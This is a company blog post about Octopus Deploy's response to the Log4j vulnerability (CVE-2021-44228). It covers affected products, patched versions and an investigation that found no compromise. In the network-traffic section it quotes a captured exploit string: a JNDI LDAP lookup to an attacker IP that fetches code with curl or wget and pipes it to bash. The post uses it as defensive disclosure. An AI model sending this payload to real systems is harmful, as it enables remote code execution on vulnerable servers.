---
title: Octopus Deploy's response to Log4j
description: Learn how Octopus Deploy responded to the Log4j vulnerability (CVE-2021-44228).
author: kyle.jackson@octopus.com
visibility: public
published: 2021-12-14-1400
metaImage: blogimage-security.png
bannerImage: blogimage-security.png
bannerImageAlt: Octopus on shield to represent security
isFeatured: false
tags: 
  - Product
  - Trust and Security
---

On Thursday, December 9, 2021, Octopus Deploy was made aware of a vulnerability in the Log4j logging utility ([CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228)). We immediately enacted our Security Incident Response Plan to investigate our use of this utility and its impact on our products and infrastructure.

Fortunately, Octopus Cloud, Octopus Server, and Octopus Tentacle are not affected. However, there are some related products that are impacted and require updates.

In this post, we share the results of our investigation and our recommended next steps for customers.

## JetBrains TeamCity plugin for Octopus Deploy

Version 6.1.7 of the JetBrains TeamCity plugin uses version 2.15.0 of Log4j. However, all versions of the plugin before 6.1.7 are using version 2.14.1 of Log4j and could be vulnerable to remote code execution.

### What you need to do

Version 6.1.7 of the Octopus Deploy plugin for TeamCity is available from the marketplace. If you're a TeamCity user, you should be notified of this update through the Web UI and we strongly encourage you to install the update.

Follow our [security advisory](https://advisories.octopus.com/adv/2021-12---Octopus-Deploy-TeamCity-Plugin-log4j2-dependency.2306410241.html) for updates.

## Octopus Java SDK

Version 0.0.3 of the Java SDK uses version 2.15.0 of Log4j. However, all versions of the Java SDK before 0.0.3 are using version 2.14.1 of Log4j and could be vulnerable to remote code execution.

### What you need to do

We recommend that customers using the Octopus Java SDK update their SDK version to 0.0.3.

Follow our [security advisory](https://advisories.octopus.com/adv/2021-13---Octopus-Java-Client-SDK-log4j2-dependency.2306475696.html) for updates.

## Octopus Cloud, Octopus Server, and Octopus Tentacle

Octopus Cloud, Octopus Server, and Octopus Tentacle are not affected by this vulnerability. They’re built with the .NET framework and don’t use any ported versions of Log4j.

## Breakdown of all products

| Product | Vulnerable Log4j version used | Vulnerable product versions | Patched product versions |
| ------- | ----------------------------- | --------------------------- | ------------------------ |
| Azure Devops & TFS Extension | No | N/A | N/A |
| Bamboo Add-on | No | N/A | N/A |
| Java SDK | Yes | <= 0.0.2 | 0.0.3 |
| Jenkins Plugin | No | N/A | N/A |
| Octopus CLI | No | N/A | N/A |
| Octopus Cloud | No | N/A | N/A |
| Octopus Server | No | N/A | N/A |
| Octopus Tentacle | No | N/A | N/A |
| TeamCity Plugin | Yes | <= 6.1.5 | 6.1.7 |

## Was Octopus Deploy compromised? 

Our internal infrastructure runs products that were using a vulnerable version of Log4j. However, we invested a significant amount of time after the initial announcement on Thursday, December 9, and we believe Octopus Deploy was not compromised.

While our engineering teams worked to update our affected products, our Security Operations team analyzed our systems to determine if they'd been exploited. The following sections will go further into our approach.

### Reviewing our internal infrastructure

The vast majority of our internal infrastructure is maintained as Infrastructure as Code (IaC). This allowed us to easily identify potentially vulnerable systems and push updates to those systems with minimal intervention.

When we couldn't determine if a system was vulnerable or not, we used known proof of concepts (PoC) to test if a system was vulnerable. This meant we could better mitigate the particular system.

### Reviewing network traffic

We maintain a lot of network data across our infrastructure, which allows us to identify suspicious network behavior that can result in exploitation of our infrastructure. While reviewing the network data, we identified the following:

1. Suspicious activity - We identified suspicious inbound network traffic to our systems including source IPs. However, we didn't identify any malicious outbound traffic which was reassuring.
1. Identifying targeted systems - While analyzing the network data we identified specific systems that were being aggressively targeted. We put extra controls and mitigations around those systems to reduce the risk of exploitation.

Here is a user agent string that was sent to one of our servers (decoded and redacted):

```
${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/(curl -s 45.155.205.233:5874/XXX.XXX.XXX.XXX:443||wget -q -O- 45.155.205.233:5874/XXX.XXX.XXX.XXX:443)|bash}
```
### Reviewing endpoints

Using the information from the network data, we reviewed specific endpoints that we knew had been aggressively targeted and confirmed they hadn't been compromised.

By using an EDR solution on our endpoints, we also closely monitored the endpoints for signs of compromise or potential exploitation. This data (along with other data sets) feeds into our SIEM (Security Incident and Event Management) system so we're alerted in near real-time and can respond accordingly.

Using all these approaches to investigate our infrastructure, we found no evidence of a compromise.

## Conclusion

We're continuing to track updates relating to this vulnerability. We'll provide further updates if there's any risk to our customers or products. 

If you have any questions, please reach out via [support@octopus.com](mailto:support@octopus.com).